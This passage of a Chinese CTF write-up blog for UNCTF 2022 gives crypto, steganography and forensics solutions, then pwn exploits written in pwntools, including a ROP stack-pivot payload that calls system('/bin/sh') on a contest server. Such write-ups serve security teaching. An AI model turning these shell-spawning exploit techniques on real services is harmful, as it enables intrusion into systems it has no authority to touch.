class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>
<p>出来不齐全的明文和一半的flag，感觉是脚本某些地方处理的不够，于是就打算凭借着仅有的明文去找原文去了，然后就找到了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170715106.png" alt="image-20230711170715106"></p>
<p>原文：</p>
<p>In the flood of darkness, hope is the light. It brings comfort, faith, and confidence. It gives us guidance when we are lost, and gives support when we are afraid. And the moment we give up hope, we give up our lives. The world we live in is disintegrating into a place of malice and hatred, where we need hope and find it harder. In this world of fear, hope to find better, but easier said than done, the more meaningful life of faith will make life meaningful.</p>
<p>刚好462位，与脚本42*11对应上了，于是就写脚本，明文切片成42位还得再与flag长度对齐才能异或，于是写了个脚本一个一个对应过来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    c.append(long_to_bytes(<span class="built_in">int</span>(i,<span class="number">16</span>)))</span><br><span class="line">m=<span class="string">&#x27;In the flood of darkness, hope is the light. It brings comfort, faith, and confidence. It gives usguidance when we are lost, and gives support whenwe are afraid. And the moment we give up hope,we give up our lives. The world we live in is disintegrating into a place of malice and hatred, where we need hope and find it harder. In this worldof fear,hope to find better, but easier said than done, themore meaningful life of faith will make life meaningful.&#x27;</span></span><br><span class="line">ls=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">42</span>):</span><br><span class="line">    ls.append(m[i:i+<span class="number">42</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    flag=strxor(c[i],ls[i][:<span class="number">29</span>].encode())</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170738212.png" alt="image-20230711170738212"></p>
<p>前面两个碰出来了，有点幸运</p>
<p>flag: <code>UNCTF&#123;Y0u_are_very_Clever!!!&#125;</code></p>
<h2 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h2><p>题目就给了两种数据一个10000,一个00000,于是尝试0,1替换，摩斯替换，对换之后也没有试出来，又根据今天吃什么的联想，想到培根密码，试了一下就出了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170833927.png" alt="image-20230711170833927"></p>
<h2 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h2><p>其实很简单，跟着代码一步步走就行了，那个key1还得看长度去看题目标题，笑死，也就是Today_is_Thursday_V_me_50，对了还有个考点就是random要是给了seed的话，每一次输出的顺序都是固定的，所以其实是伪随机的，贴脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = <span class="string">b&quot;Today_is_Thursday_V_me_50&quot;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line">random.seed(key1_num)</span><br><span class="line">s=[<span class="string">&#x27;Q&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="number">0x18</span>,<span class="number">0x1b</span>,<span class="string">&#x27;(&#x27;</span>,<span class="number">0x03</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">0x08</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="number">0x12</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;P&#x27;</span>]</span><br><span class="line">nums=[]</span><br><span class="line">temptext=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    nums.append(temp_num)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(s[i])==<span class="built_in">int</span>:</span><br><span class="line">        temptext+=long_to_bytes(s[i]^nums[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temptext+=long_to_bytes(<span class="built_in">ord</span>(s[i])^nums[i])</span><br><span class="line">cipher=<span class="string">b&#x27;7\x1a\x02\x15\x17&lt;\x1c\x15+:\x0b\x00\x14\x07\n\x02\x0c9&quot;1\x0e\x109A^&#x27;</span></span><br><span class="line">plain=strxor(cipher,temptext)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">guess=[i for i in itertools.permutations(name, 5)]</span></span><br><span class="line"><span class="string">for i in range(4):</span></span><br><span class="line"><span class="string">        what = guess.pop(50)</span></span><br><span class="line"><span class="string">        name = &#x27;&#x27;.join(j for j in what)</span></span><br><span class="line"><span class="string">        mask = strxor(5*name.encode(),key1)</span></span><br><span class="line"><span class="string">        print(mask)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;7\x1a\x02\x15\x17&lt;\x1c\x15+:\x0b\x00\x14\x07\n\x02\x0c9&quot;1\x0e\x109A^&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag: <code>UNCTF&#123;1_l0ve_Thurs4Ay!!!&#125;</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h2><p>乱码啥的看都没看，直接丢零宽里面解出来了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170920573.png" alt="image-20230711170920573"></p>
<p>flag :<code>UNCTF&#123;We1come_new_ctfer&#125;</code></p>
<h2 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h2><p>word打开隐藏文字没东西，直接改成zip去翻，在document.xml里面找到了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170936648.png" alt="image-20230711170936648"></p>
<p>flag:<code>UNCTF&#123;You_find_me!&#125;</code></p>
<h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h2><p>winhex发现里面还有压缩包，于是去binwalk一下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/wps16.jpg" alt="img"> </p>
<p>Binwalk -e 提取一下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/wps17.jpg" alt="img"> </p>
<p>找到个syslog，应该是系统日志，在里面找到压缩包的密码，搜索关键词password</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/wps18.jpg" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171028216.png" alt="image-20230711171028216"></p>
<p>解压得到flag</p>
<p>flag: <code>UNCTF&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p>
<h2 id="社什么社"><a href="#社什么社" class="headerlink" title="社什么社"></a>社什么社</h2><p>这题靠手动爆破得出，从出题学校开始搜索附近的景点，直到搜索到凤凰古城就对了</p>
<p>flag:<code>UNCTF&#123;4F0198127A45F66C07A5B1A2DDA8223C&#125;</code></p>
<h2 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h2><p>还好wps可以试用编辑pdf功能</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171105851.png" alt="image-20230711171105851"></p>
<p>找到密文，base64解密一下得到如下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171111710.png" alt="image-20230711171111710"></p>
<p>根据题目，应该是摩斯，将依古比古换成点，玛卡巴卡换成杠，就出了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171120362.png" alt="image-20230711171120362"></p>
<p>flag: <code>UNCTF&#123;WAN_AN_MAKA_BAKAAAAA!&#125;</code></p>
<h2 id="巨鱼"><a href="#巨鱼" class="headerlink" title="巨鱼"></a>巨鱼</h2><p>binwalk查看，foremost提取</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171138975.png" alt="image-20230711171138975"></p>
<p>得到个压缩包需要密码，分析一下图片，改个宽高找到密码</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171151828.png" alt="image-20230711171151828"></p>
<p>密码就是无所谓我会出手，解压出一个flag.txt，是假的flag，还有一个压缩包，用Ziperello打开发现没有加密，是伪加密，去修改下加密字节，得到一张图片和一个ppt</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171157949.png" alt="image-20230711171157949"></p>
<p>图片化学物质的分子式是C6H6Cl6，去查了一下，发现俗名叫六六六，于是猜测密码就是666，打开ppt得到，在最后一页的ppt全选改个颜色flag就出了</p>
<p>flag: <code>UNCTF&#123;y0u_F1nd_1t!&#125;</code></p>
<h2 id="zhiyin"><a href="#zhiyin" class="headerlink" title="zhiyin"></a>zhiyin</h2><p>附件有三个，flag.txt在压缩包里，是真加密，那么先看两张图片。先看zhiyin.png，winhex打开在文件末尾发现摩斯密码，解密</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171221474.png" alt="image-20230711171221474"></p>
<p>感觉是某个字符串的后半部分，先放着，再去看lanqiu.jpg，winhex打开发现文件十六进制被倒置了，把十六进制复制出来，写个脚本跑一下再贴进新的文件里面，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=’’ <span class="comment">#十六进制连起来丢进去即可</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s),<span class="number">0</span>,-<span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(s[i-<span class="number">2</span>:i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到的结果手动放进新文件里</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171249702.png" alt="image-20230711171249702"></p>
<p>成功打开，图片上面是字符串的前半段</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171258707.png" alt="image-20230711171258707"></p>
<p>拼接起来就是Go_p1ay_unc7f!!!，应该是压缩包的密码</p>
<p>这里play和p1ay要试一试，还有后面的大小写要试一下</p>
<p>压缩包还有个点，就是把文件头的504B改成了5048，所以要去改回来，解压就得到flag</p>
<p>flag:<code>flag&#123;M1sic_1s_greAt&#125;</code></p>
<h2 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h2><p>压缩包密码去b站搜清和，最多点击前面全是清和Alicia这个up主的视频，那么就去找她的uid和视频最多播放量的日期</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171331362.png" alt="image-20230711171331362"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171335400.png" alt="image-20230711171335400"></p>
<p>密码即为836885_2022/05/20</p>
<p>解压之后又得到一个图片和一个压缩包，图片不管是宽高，winhex，binwalk，最后用zsteg发现有password</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171343196.png" alt="image-20230711171343196"></p>
<p>拿密码解压压缩包，得到一个音频文件和flag.zip,音频一听就知道是啥了，SSTV，都考烂了都，我用MMSSTV去接收的，最好用虚拟声卡，不然外放很吵，还会有杂音</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171351395.png" alt="image-20230711171351395"></p>
<p>得到密码，解压得到flag.txt，用sublime打开发现有零宽，去在线解一下得到flag</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171357915.png" alt="image-20230711171357915"></p>
<p>flag: <code>UNCTF&#123;wha1e_wants_a_girlfriend_like_alicia&#125;</code></p>
<h2 id="我小心海也绝非鳝类"><a href="#我小心海也绝非鳝类" class="headerlink" title="我小心海也绝非鳝类"></a>我小心海也绝非鳝类</h2><p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171418962.png" alt="image-20230711171418962"></p>
<p>Basecrack出来是base92,得到一串字符串，先放着</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171425259.png" alt="image-20230711171425259"></p>
<p>Winhex发现末尾有base64字符串，解出来是EASYLSB，那么应该是考LSB隐写了，结合前面的字符串，猜测是有密码的LSB隐写，于是用cloacked-pixel跑一下，密码就是前面的flaginmd5,出来一个文件</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171433758.png" alt="image-20230711171433758"></p>
<p>结合密码flaginmd5，这一长串可能是很多个md5值，前面试了两个刚好是fl,于是写脚本爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(<span class="built_in">chr</span>(j).encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest().upper()==data[i:i+<span class="number">32</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171452406.png" alt="image-20230711171452406"></p>
<p>flag: <code>UNCTF&#123;welcome_to_misc&#125;</code></p>
<h2 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h2><p>key在文件很下面，一开始一直用zhimakaimen没解出来，这题同心海那题，有key考虑lsb的隐写，直接用下面的key1解出</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171510386.png" alt="image-20230711171510386"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171514724.png" alt="image-20230711171514724"></p>
<p>flag: <code>UNCTF&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h2><p>我这边nc不通，就直接写脚本传参了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">35651</span>)</span><br><span class="line">payload = <span class="string">&#x27;UNCTF&amp;2022&#x27;</span> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171550490.png" alt="image-20230711171550490"></p>
<p>flag: <code>UNCTF&#123;05c106f2-2d96-44fa-828a-c3afcb626473&#125;</code></p>
<h2 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h2><p>考的是一个srand的伪随机数，因为有seed，srand输出的随机数顺序是固定的，ida反编译可以看到这里seed为0xA</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171614783.png" alt="image-20230711171614783"></p>
<p>然后找到函数关键点，就是100次石头剪刀布，根据已知的顺序去写脚本即可</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171622957.png" alt="image-20230711171622957"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">39415</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">v4 = libc.srand(<span class="number">0xA</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Will you learn about something of pwn later?(y/n)\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">recv1 = p.recv()</span><br><span class="line"><span class="built_in">print</span>(recv1)</span><br><span class="line">recv2 = p.recv()</span><br><span class="line"><span class="built_in">print</span>(recv2)</span><br><span class="line"><span class="keyword">while</span>  <span class="string">b&quot;round&quot;</span> <span class="keyword">in</span> recv2:</span><br><span class="line">        randnum = libc.rand() % <span class="number">3</span></span><br><span class="line">        choose = <span class="built_in">bytes</span>(<span class="built_in">str</span>((randnum-<span class="number">1</span>)%<span class="number">3</span>),encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        p.sendline(choose)</span><br><span class="line">        recv1 = p.recv()</span><br><span class="line">        <span class="built_in">print</span>(recv1)</span><br><span class="line">        recv2 = p.recv()</span><br><span class="line">        <span class="built_in">print</span>(recv2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171645048.png" alt="image-20230711171645048"></p>
<p>flag: <code>UNCTF&#123;51b397a6-9c3a-4b47-a170-92a7d8c94a64&#125;</code></p>
<h2 id="move-your-heart"><a href="#move-your-heart" class="headerlink" title="move your heart"></a>move your heart</h2><p>查一下防护机制，发现开了NX</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171701233.png" alt="image-20230711171701233"></p>
<p>Ida反编译查看，发现第一步和上一题一样，也是伪随机数</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171707022.png" alt="image-20230711171707022"></p>
<p>进到back函数，发现是个栈迁移的题目</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171719074.png" alt="image-20230711171719074"></p>
<p>因为程序只有call system，所以需要我们自己去写入”/bin/sh”</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/lcw_linyx/article/details/124890278">https://blog.csdn.net/lcw_linyx/article/details/124890278</a></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">38574</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name,addr))</span><br><span class="line">libc.srand(<span class="number">0x42</span>)</span><br><span class="line">v4 = <span class="built_in">bytes</span>(<span class="built_in">str</span>(libc.rand()),encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">p.sendline(v4)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(p.recv()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;gift&quot;</span>,gift)</span><br><span class="line">read = <span class="number">0x4012BF</span> </span><br><span class="line">system = <span class="number">0x401307</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013d3</span></span><br><span class="line">Sh = gift - <span class="number">0x20</span></span><br><span class="line">payload = flat(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>,pop_rdi,sh,system,gift,read)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload2 = flat(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171745446.png" alt="image-20230711171745446"></p>
<p>flag: <code>UNCTF&#123;3Asy_StaCk_0:)&#125;</code></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>查看防护</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171801187.png" alt="image-20230711171801187"></p>
<p>就开了个NX</p>
<p>ida拖进去看，发现考点是整数溢出，题目要求输入大小要小于等于32位，但是只检测了第一位</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171808570.png" alt="image-20230711171808570"></p>
<p>Atoi函数是将str转换为int，直接用空字符就可以绕过</p>
<p>程序把flag.txt的内容读取到了flag的这个位置，所以直接puts就可以输出了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171816557.png" alt="image-20230711171816557"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711171822598.png" alt="image-20230711171822598"></p>
<p>Exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line">p = remote(<span 